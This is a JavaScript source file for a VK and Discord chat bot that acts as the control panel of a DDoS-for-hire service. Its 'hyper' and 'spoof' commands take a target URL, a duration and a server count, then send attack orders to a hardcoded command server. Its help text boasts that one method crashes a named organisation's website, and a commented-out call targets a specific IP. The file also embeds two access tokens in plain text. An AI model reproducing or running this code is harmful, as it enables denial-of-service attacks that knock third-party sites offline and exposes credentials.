const { VK, Keyboard } = require('vk-io');
require('dotenv').config();
const userToken = `vk1.a.v6jk5u2VMRTfWLedNlwBC6BTsIPJu5yUT_dSr6BIFY97dp8biTyWVtNi9B8YLZ4H0pr2B7sBD573P6EvV4EjVf_4X8kICVsYW8QZ_fm9T-pmBRmxqz_wobzBLSohSIlNjjFg-yL6zak1lD3GlwkW2gbs9EsfBTnZ02-XmJ2iI5lU9YXMT5VptWUIXvgWupMocKJPBT-Z-rjuQuXz_8kaXw`;
const botToken = `vk1.a.9hRTJcxZ4Lq7mdp0_Hd6qsxwg1iIJ8LQHrITStCB991224330cJnKjA26fM4VTbMWqpdG69YI9-tkWIUjj8mXaiUAbdmaEM53RvxBsGUF4uuJAg40I3iKq3kQZEiKCntY-Res1xGtqopIub9v-DnCAhKK1qw18n76zKVWC0G8_KzsHny-KynPvlbJGfv772b1yh1-jVxpUhUZBhfnmQrKQ`;
const vk = new VK({
    token: botToken,
    pollingGroupId: 214188938
});
const commands = [];
let usera = new VK({
    token: userToken
});

const axios = require('axios');
const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

const servers = require('./servers.json')

setInterval(async () => {
    await saveServers();
}, 300);

async function saveServers()
{
    require('fs').writeFileSync('./servers.json', JSON.stringify(servers, null, '\t'));
    return true;
}

const { updates, snippets } = vk;

updates.startPolling();

updates.on('message', async (msg) => {
    if(Number(msg.senderId) <= 0) return;
    if(msg.isOutbox) return;
    const bot = (text, params) => {
        return msg.send(`${text}`, params);
    }

    const command = commands.find(x => x[0].test(msg.text));

    if(!command && !msg.eventPayload && !msg.isChat) return bot(`Я не знаю такой команды. Чтобы узнать команды, пишите "помощь".`);

    if(command){
        msg.args = msg.text.match(command[0]);
        await command[1](msg, bot);
    }
})

const cmd = {
    hear: (p, f) => {
        commands.push([p, f]);
    }
};

let isValidUrl = url => {
    try {
        new URL(url); 
        return true 
    } 
    catch(e) { 
        return false 
    }
}

const base_url = 'http://195.2.73.98:5000/api/session/cmd'

cmd.hear(/^(?:hyper)\s(.*)\s([0-9]+)\s([0-9]+)$/i, async (msg, bot) => {
    let unchanged_url = msg.args[1]
    if(!isValidUrl(unchanged_url)) return bot(`чё за хуйня а не URL`)
    let url = unchanged_url.replace(':', '%3A')
    url = url.replaceAll('/', '%2F')
    url = url.replaceAll('#', '%23')
    url = url.replaceAll('&', '%26')
    url = url.replaceAll('=', '%3D')
    url = url.replaceAll('?', '%3F')
    let free_servers = servers.filter(x => x.status === false)
    let doubt_servers = []
    const concs = msg.args[3]
    if(concs > free_servers.length) return bot(`Чё-то ты дохуя захотел`)
    const time = parseInt(msg.args[2])
    if(time > 300) return bot(`Чё-то ты дохуя захотел`)
    for(i in free_servers) {
        if(doubt_servers.length >= concs) break
        doubt_servers.push(free_servers[i])
        let server = servers.find(x => x.uid === free_servers[i].uid)
        server.status = true
    }
    for(i in doubt_servers) {
        let server = servers.find(x => x.uid === doubt_servers[i].uid)
        server.url = unchanged_url
        fetch(base_url, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                Accept: "*/*"
            },
            body: `session_uid=${server.uid}&cmd=hyper+${url}+${time}`
        })
        server.seconds = time
        let popa = setInterval(() => {
            server.seconds -= 1
        }, 1000)
        setTimeout(() => {
            server.status = false
            clearInterval(popa)
            server.seconds = 0
            server.url = ""
        }, time * 1000)
    }
    return bot(`Успешно отправлено на ${unchanged_url} на ${time} секунд`)
})

cmd.hear(/^(?:spoof)\s(.*)\s([0-9]+)\s([0-9]+)$/i, async (msg, bot) => {
    let unchanged_url = msg.args[1]
    if(!isValidUrl(unchanged_url)) return bot(`чё за хуйня а не URL`)
    let url = unchanged_url.replace(':', '%3A')
    url = url.replaceAll('/', '%2F')
    url = url.replaceAll('#', '%23')
    url = url.replaceAll('&', '%26')
    url = url.replaceAll('=', '%3D')
    url = url.replaceAll('?', '%3F')
    let free_servers = servers.filter(x => x.status === false)
    let doubt_servers = []
    const concs = msg.args[3]
    if(concs > free_servers.length) return bot(`Чё-то ты дохуя захотел`)
    const time = parseInt(msg.args[2])
    if(time > 300) return bot(`Чё-то ты дохуя захотел`)
    for(i in free_servers) {
        if(doubt_servers.length >= concs) break
        doubt_servers.push(free_servers[i])
        let server = servers.find(x => x.uid === free_servers[i].uid)
        server.status = true
    }
    for(i in doubt_servers) {
        let server = servers.find(x => x.uid === doubt_servers[i].uid)
        server.url = unchanged_url
        fetch(base_url, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                Accept: "*/*"
            },
            body: `session_uid=${server.uid}&cmd=spoof+${url}+${time}`
        })
        server.seconds = time
        let popa = setInterval(() => {
            server.seconds -= 1
        }, 1000)
        setTimeout(() => {
            server.status = false
            clearInterval(popa)
            server.seconds = 0
            server.url = ""
        }, time * 1000)
    }
    return bot(`Успешно отправлено на ${unchanged_url} на ${time} секунд`)
})

cmd.hear(/^(?:инфо)$/i, async (msg, bot) => {
    let free_servers = servers.filter(x => x.status === false).length

    let server1 = `Сервер 1:\n`
    if(servers[0].status == false) server1 += "Статус: свободен\n"
    else if(servers[0].status == true) server1 += `Статус: используется\nОставшееся время: ${servers[0].seconds} секунд\nАктивен на ${servers[0].url}`

    let server2 = `Сервер 2:\n`
    if(servers[1].status == false) server2 += "Статус: свободен\n"
    else if(servers[1].status == true) server2 += `Статус: используется\nОставшееся время: ${servers[1].seconds} секунд\nАктивен на ${servers[1].url}`

    return bot(`Свободных серверов: ${free_servers}\n\n${server1}\n\n${server2}`)
})

cmd.hear(/^(?:hyper)(.*)$/i, async (msg, bot) => {
    return bot(`хуйня`)
})

cmd.hear(/^(?:spoof)(.*)$/i, async (msg, bot) => {
    return bot(`хуйня`)
})


client.on('ready', () => {
    console.log('bot is ready');
})

client.on('interactionCreate', (interaction) => {
    if(!interaction.isChatInputCommand()) return;

    if(interaction.commandName === 'инфо') {
        let free_servers = servers.filter(x => x.status === false).length

        let server1 = `Сервер 1:\n`
        if(servers[0].status == false) server1 += "Статус: свободен\n"
        else if(servers[0].status == true) server1 += `Статус: используется\nОставшееся время: ${servers[0].seconds} секунд\nАктивен на ${servers[0].url}`

        let server2 = `Сервер 2:\n`
        if(servers[1].status == false) server2 += "Статус: свободен\n"
        else if(servers[1].status == true) server2 += `Статус: используется\nОставшееся время: ${servers[1].seconds} секунд\nАктивен на ${servers[1].url}`
        
        interaction.reply(`Свободных серверов: ${free_servers}\n\n${server1}\n\n${server2}`)
    }

    if(interaction.commandName === 'hyper') {
        let unchanged_url = interaction.options.get('ссылка').value
        if(!isValidUrl(unchanged_url)) interaction.reply(`чё за хуйня а не ссылка`)
        let url = unchanged_url.replace(':', '%3A')
        url = url.replaceAll('/', '%2F')
        url = url.replaceAll('#', '%23')
        url = url.replaceAll('&', '%26')
        url = url.replaceAll('=', '%3D')
        url = url.replaceAll('?', '%3F')
        let free_servers = servers.filter(x => x.status === false)
        let doubt_servers = []
        const concs = interaction.options.get('кол-во_серверов').value
        if(concs > free_servers) return interaction.reply(`Чё-то ты дохуя захотел`)
        const time = interaction.options.get('время').value
        if(time > 300) return interaction.reply(`Чё-то ты дохуя захотел`)
        for(i in free_servers) {
            if(doubt_servers.length >= concs) break
            doubt_servers.push(free_servers[i])
            let server = servers.find(x => x.uid === free_servers[i].uid)
            server.status = true
        }
        for(i in doubt_servers) {
            let server = servers.find(x => x.uid === doubt_servers[i].uid)
            server.url = unchanged_url
            fetch(base_url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    Accept: "*/*"
                },
                body: `session_uid=${server.uid}&cmd=hyper+${url}+${time}`
            })
            server.seconds = time
            let popa = setInterval(() => {
                server.seconds -= 1
            }, 1000)
            setTimeout(() => {
                server.status = false
                clearInterval(popa)
                server.seconds = 0
                server.url = ""
            }, time * 1000)
        }
        interaction.reply(`Успешно отправлено на ${unchanged_url} на ${time} секунд`)
    }
    if(interaction.commandName === 'spoof') {
        let unchanged_url = interaction.options.get('ссылка').value
        if(!isValidUrl(unchanged_url)) interaction.reply(`чё за хуйня а не ссылка`)
        let url = unchanged_url.replace(':', '%3A')
        url = url.replaceAll('/', '%2F')
        url = url.replaceAll('#', '%23')
        url = url.replaceAll('&', '%26')
        url = url.replaceAll('=', '%3D')
        url = url.replaceAll('?', '%3F')
        let free_servers = servers.filter(x => x.status === false)
        let doubt_servers = []
        const concs = interaction.options.get('кол-во_серверов').value
        if(concs > free_servers) return interaction.reply(`Чё-то ты дохуя захотел`)
        const time = interaction.options.get('время').value
        if(time > 300) return interaction.reply(`Чё-то ты дохуя захотел`)
        for(i in free_servers) {
            if(doubt_servers.length >= concs) break
            doubt_servers.push(free_servers[i])
            let server = servers.find(x => x.uid === free_servers[i].uid)
            server.status = true
        }
        for(i in doubt_servers) {
            let server = servers.find(x => x.uid === doubt_servers[i].uid)
            server.url = unchanged_url
            fetch(base_url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    Accept: "*/*"
                },
                body: `session_uid=${server.uid}&cmd=spoof+${url}+${time}`
            })
            server.seconds = time
            let popa = setInterval(() => {
                server.seconds -= 1
            }, 1000)
            setTimeout(() => {
                server.status = false
                clearInterval(popa)
                server.seconds = 0
                server.url = ""
            }, time * 1000)
        }
        interaction.reply(`Успешно отправлено на ${unchanged_url} на ${time} секунд`)
    }
})

client.on('messageCreate', (msg) => {
    if(msg.content.toLocaleLowerCase() === 'инфо') {
        let free_servers = servers.filter(x => x.status === false).length

        let server1 = `Сервер 1:\n`
        if(servers[0].status == false) server1 += "Статус: свободен\n"
        else if(servers[0].status == true) server1 += `Статус: используется\nОставшееся время: ${servers[0].seconds} секунд\nАктивен на ${servers[0].url}`

        let server2 = `Сервер 2:\n`
        if(servers[1].status == false) server2 += "Статус: свободен\n"
        else if(servers[1].status == true) server2 += `Статус: используется\nОставшееся время: ${servers[1].seconds} секунд\nАктивен на ${servers[1].url}`
        
        msg.reply(`Свободных серверов: ${free_servers}\n\n${server1}\n\n${server2}`)
    }
    if(msg.content.toLocaleLowerCase() === 'методы') {
        msg.reply(`/hyper <ссылка> <время(сек)> <кол-во серваков> - для нн сайтов\n\n/spoof <ссылка> <время(сек)> <кол-во серваков> - тоже для нн сайтов, но он на изи крашит сайт ай&кемп'а`)
    }
})

client.login(process.env.TOKEN);

// fetch(base_url, {
//     method: "POST",
//     headers: {
//         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
//         Accept: "*/*"
//     },
//     body: "session_uid=70f60e6ef793bc79692a56e6f30d12e7&cmd=hyper+http%3A%2F%2F50.7.232.90+20"
// })